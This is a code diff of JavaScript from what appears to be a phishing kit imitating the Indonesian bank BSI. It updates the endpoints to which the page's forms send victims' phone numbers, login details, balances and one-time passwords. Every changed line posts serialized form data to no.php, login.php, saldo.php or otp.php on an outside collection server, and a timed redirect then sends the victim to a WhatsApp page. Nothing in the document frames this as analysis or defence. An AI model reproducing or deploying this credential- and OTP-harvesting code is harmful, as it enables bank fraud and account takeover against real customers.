@@ -12,7 +12,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/7h27g/no.php',
+            url: 'https://demcloud.my.id/BSI/vk98kd/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -40,7 +40,7 @@ $('.process1').fadeIn();
     }   
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/7h27g/login.php',
+            url: 'https://demcloud.my.id/BSI/vk98kd/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -77,7 +77,7 @@ $('.process1').fadeIn();
     }   
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/7h27g/saldo.php',
+            url: 'https://demcloud.my.id/BSI/vk98kd/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -119,7 +119,7 @@ function sendOtp() {
     }   
 $.ajax({
  type: 'POST',
- url: 'https://demcloud.my.id/BSI/7h27g/otp.php',
+ url: 'https://demcloud.my.id/BSI/vk98kd/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -153,7 +153,7 @@ document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
 function getcs(){
  $("#djload").show();       
 setTimeout(function(){  
-location.href='https://demcloud.my.id/BSI/7h27g/wa';
+location.href='https://demcloud.my.id/BSI/vk98kd/wa';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
